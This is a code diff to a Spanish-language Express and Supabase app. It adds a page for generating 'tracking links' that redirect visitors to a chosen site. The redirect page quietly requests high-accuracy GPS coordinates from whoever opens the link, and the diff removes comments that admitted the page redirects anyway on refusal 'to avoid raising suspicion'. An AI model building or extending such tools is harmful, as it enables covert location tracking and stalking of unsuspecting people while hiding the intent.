@@ -5,7 +5,6 @@ const { createClient } = require('@supabase/supabase-js');
 const app = express();
 app.use(express.json());
 
-// Permitir trust proxy para Render
 app.set('trust proxy', true);
 
 const supabaseUrl = process.env.SUPABASE_URL;
@@ -17,6 +16,65 @@ if (!supabaseUrl || !supabaseKey) {
 }
 
 const supabase = createClient(supabaseUrl, supabaseKey);
+
+/**
+ * 0. Panel visual automático en la raíz (para generar enlaces fácilmente desde el navegador)
+ */
+app.get('/', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Generador de Enlaces</title>
+      <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 2rem; border-radius: 16px; width: 90%; max-width: 400px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
+        h3 { margin-top: 0; font-size: 1.25rem; }
+        input { width: 100%; padding: 0.75rem; margin: 1rem 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; font-size: 1rem; }
+        button { width: 100%; padding: 0.75rem; background: #2563eb; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 1rem; }
+        button:hover { background: #1d4ed8; }
+        .result { margin-top: 1.5rem; word-break: break-all; font-size: 0.9rem; background: #0f172a; padding: 1rem; border-radius: 8px; border: 1px solid #334155; display: none; }
+        a { color: #38bdf8; text-decoration: none; }
+      </style>
+    </head>
+    <body>
+      <div class="card">
+        <h3>Nuevo Link de Rastreo</h3>
+        <p style="color: #94a3b8; font-size: 0.85rem; margin-bottom: 1rem;">Escribe la web de destino:</p>
+        <input type="text" id="targetUrl" value="https://google.com" placeholder="https://google.com">
+        <button onclick="generar()">Generar Enlace</button>
+        <div class="result" id="output"></div>
+      </div>
+      <script>
+        async function generar() {
+          const url = document.getElementById('targetUrl').value;
+          const btn = document.querySelector('button');
+          btn.textContent = 'Generando...';
+          try {
+            const res = await fetch('/api/generate-link', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ targetUrl: url })
+            });
+            const data = await res.json();
+            if(data.success) {
+              const out = document.getElementById('output');
+              out.style.display = 'block';
+              out.innerHTML = '<b>Enlace creado:</b><br><br><a href="'+data.link+'" target="_blank">'+data.link+'</a>';
+            }
+          } catch(e) {
+            alert('Error al generar');
+          } finally {
+            btn.textContent = 'Generar Enlace';
+          }
+        }
+      </script>
+    </body>
+    </html>
+  `);
+});
 
 /**
  * 1. Endpoint para generar el enlace
@@ -72,7 +130,6 @@ app.get('/r/:id', async (req, res) => {
 
     const destination = linkRecord.target_url;
 
-    // Pantalla limpia y básica que fuerza/pide la ubicación para continuar
     const html = `
       <!DOCTYPE html>
       <html lang="es">
@@ -119,15 +176,9 @@ app.get('/r/:id', async (req, res) => {
           }
 
           if ("geolocation" in navigator) {
-            // Intentar obtener la posición exacta del hardware GPS
             navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                proceed(pos.coords);
-              },
-              (err) => {
-                // Si rechaza o falla, redirige igual para no levantar sospechas
-                proceed(null);
-              },
+              (pos) => { proceed(pos.coords); },
+              (err) => { proceed(null); },
               { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
             );
           } else {
